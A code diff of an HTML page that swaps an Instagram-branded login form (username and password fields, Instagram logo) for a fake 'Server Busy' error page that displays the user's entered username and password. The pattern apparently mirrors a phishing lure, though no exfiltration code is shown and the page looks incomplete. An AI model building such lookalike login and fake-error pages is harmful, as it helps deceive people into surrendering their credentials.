@@ -3,16 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Server Busy</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            color: white;
+        }
+        .error-container {
+            background: #121212;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+        .back-btn {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: white;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
-        <input type="text" placeholder="Username" id="username">
-        <input type="password" placeholder="Password" id="password">
-        <button onclick="login()">Log In</button>
+    <div class="error-container">
+        <h2>Server Busy</h2>
+        <p>The server is currently busy. Please try again later.</p>
+        <h3>Your Entered Details:</h3>
+        <p><strong>Username:</strong> <span id="display-username"></span></p>
+        <p><strong>Password:</strong> <span id="display-password"></span></p>
+        <button class="back-btn" onclick="goBack()">Go Back</button>
     </div>
-    <script src="script.js"></script>
 </body>
 </html>
